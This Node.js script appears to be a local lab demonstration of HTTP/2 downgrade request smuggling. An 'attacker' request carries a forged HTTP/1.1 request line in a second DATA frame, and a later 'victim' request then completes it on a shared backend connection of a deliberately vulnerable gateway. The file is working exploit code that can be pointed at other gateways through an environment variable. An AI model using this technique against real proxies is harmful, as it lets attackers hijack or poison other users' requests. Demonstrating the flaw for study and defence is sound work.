'use strict';

/**
 * Sends two genuinely separate HTTP/2 requests, on two separate HTTP/2
 * connections, to ./gateway.js - standing in for an attacker and an
 * unrelated normal client sharing the same downstream gateway and
 * pooled backend connection. Neither request sets a `content-length`
 * header - that's legal HTTP/2 (DATA framing is self-describing), and
 * it's also what lets this script run against a real, spec-compliant
 * HTTP/2 client without Node's own content-length validation getting
 * in the way (see gateway.js's top comment for why that matters).
 *
 * Step 1 ("attacker") writes its body in two separate DATA writes:
 * 5 bytes, then (after a short delay, to force two distinct frames
 * instead of one coalesced write) the start of a forged HTTP/1.1
 * request line and header - deliberately left without the blank line
 * that would terminate an HTTP header block.
 *
 * Against the gateway's default VULNERABLE mode, it forwards to the
 * backend as soon as the first 5-byte chunk arrives, declaring
 * Content-Length: 5 - then simply relays the second chunk as raw
 * extra bytes once that "request" is already underway.
 *
 * Step 2 ("victim") is an ordinary, unrelated request, sent shortly
 * after on a different connection.
 *
 * Watch ./backend.js's own log output (not this script's output) to
 * see the result: against the gateway's default vulnerable mode, the
 * backend should report parsing a request whose request line is the
 * attacker's forged "GET /smuggled-by-h2 HTTP/1.1" - not the real
 * "POST /victim-path" - with the "victim" request's own body
 * underneath it. Re-run with the gateway started as
 * `SAFE_MODE=1 node gateway.js` and the backend should instead report
 * two clean, separate, correctly-attributed requests.
 */

const http2 = require('http2');

const GATEWAY_URL = process.env.GATEWAY_URL || 'http://127.0.0.1:8443';

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function request(path, writes) {
  return new Promise((resolve, reject) => {
    const session = http2.connect(GATEWAY_URL);
    session.on('error', reject);

    const req = session.request({ ':method': 'POST', ':path': path });
    let response = '';
    req.setEncoding('utf8');
    req.on('data', chunk => (response += chunk));
    req.on('end', () => {
      session.close();
      resolve(response);
    });
    req.on('error', reject);

    (async () => {
      for (const { text, delayBeforeMs } of writes) {
        if (delayBeforeMs) await sleep(delayBeforeMs);
        req.write(Buffer.from(text, 'latin1'));
      }
      req.end();
    })();
  });
}

async function main() {
  console.log('=== Step 1: attacker request ===');
  console.log('Sends its body as two separate HTTP/2 DATA writes: 5 bytes,');
  console.log('then the unterminated start of a forged HTTP/1.1 request.\n');

  const r1 = await request('/attacker-echo', [
    { text: 'AAAAA' },
    {
      text:
        'GET /smuggled-by-h2 HTTP/1.1\r\n' +
        'X-Injected-By: h2-downgrade-smuggling\r\n',
      delayBeforeMs: 150,
    },
  ]);
  console.log('Gateway response to attacker:', JSON.stringify(r1.trim()));

  await sleep(500);

  console.log('\n=== Step 2: a separate, perfectly ordinary request ===');
  console.log('Different HTTP/2 connection, simulating a different client.');
  console.log('Its bytes land right after the forged header line above on');
  console.log('the shared backend connection, completing it.\n');

  const r2 = await request('/victim-path', [{ text: 'hello' }]);
  console.log('Gateway response to "victim":', JSON.stringify(r2.trim()));

  console.log('\nNow check the backend.js terminal for what it actually parsed.');
}

main().catch(err => {
  console.error(err);
  process.exitCode = 1;
});
